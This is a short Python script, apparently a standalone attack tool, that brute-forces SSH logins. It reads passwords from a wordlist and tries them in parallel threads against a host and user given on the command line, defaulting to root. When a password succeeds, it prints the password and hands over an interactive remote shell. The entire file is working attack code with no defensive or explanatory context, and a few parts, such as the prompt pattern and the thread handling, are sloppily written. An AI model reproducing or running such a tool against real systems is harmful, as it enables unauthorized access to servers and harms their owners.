
import sys
import pexpect
import threading
import os

host = "127.0.0.1"
user = "root"
PROMPT = r"[#|>>>|>|\$]"
MAX_CONNECTIONS = 10 #default max ssh sessions for Linux
found = False
threads = []
connString = ""

def tryPass(p):
    global found
    child = pexpect.spawn(connString)
    child.expect("[P|p]assword:")
    child.send(p)
    ret = child.expect([pexpect.TIMEOUT,"[P|p]assword:",PROMPT])

    if(ret == 2):
        found = True
        print("Password found: " + p + "\n Press Enter to login to remote shell.")
        input()
        child.interact()
        
    return False

if(len(sys.argv)>1):
    host = sys.argv[1]

if(len(sys.argv)>2):
    user = sys.argv[2]
connString = "ssh " + user + "@" + host

try:
    f = open("words.txt")
    passes = f.readlines()
    f.close()
except OSError as err:
    print(err)
    exit(1)

def threadLoop():
    for i in range(MAX_CONNECTIONS):
        if(found):
            break
        if(len(passes)==0):
            print("Wordlist exhausted. No matches. Exiting.")
            exit(0)

        p = passes.pop()
        t = threading.Thread(target=tryPass,args=[p])
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
        threads.remove(t)
    threadLoop()
    
threadLoop()




